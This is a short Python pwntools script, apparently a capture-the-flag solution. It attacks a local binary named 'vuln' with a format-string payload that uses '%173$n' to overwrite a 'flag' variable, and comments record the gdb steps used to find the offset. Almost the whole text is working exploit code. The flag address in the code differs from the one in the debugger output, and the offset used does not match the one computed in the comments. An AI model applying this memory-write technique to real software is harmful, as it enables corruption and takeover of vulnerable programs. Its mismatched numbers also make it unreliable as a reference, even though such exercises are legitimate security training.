# sudo apt install gdb gdbserver
# pip3 install pwn

from tkinter import E
from pwn import *

context.log_level = 'WARNING'

#context.terminal = ['tmux', 'splitw', '-h']

################## addresses #########################

# gef➤  info variables flag
# All variables matching regular expression flag:
# 
# Non-debugging symbols:
# 0x0804c028  flag

FLAG = 0x804c024

EXPL = b""
EXPL += b"A"*4
EXPL += p32(FLAG)
EXPL += b"B"*9
EXPL += b"\n"

# break on printf call

# gef➤ grep AAAA
# [+] Searching 'AAAA' in memory
# [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
#   0xffffd698 - 0xffffd69c  →   "AAAA[...]"

# gef➤ print $esp
# $1 = (void *) 0xffffd450

# (0xffffd698 - 0xffffd450) // 4 == 146
# add 1 to read flag address

EXPL += f"%173$n\n".encode("utf-8")


p = process(['./vuln', EXPL])
gdb.attach(p, '''
b *(main+62)
c
grep AAAA
print $esp
''')

p.interactive()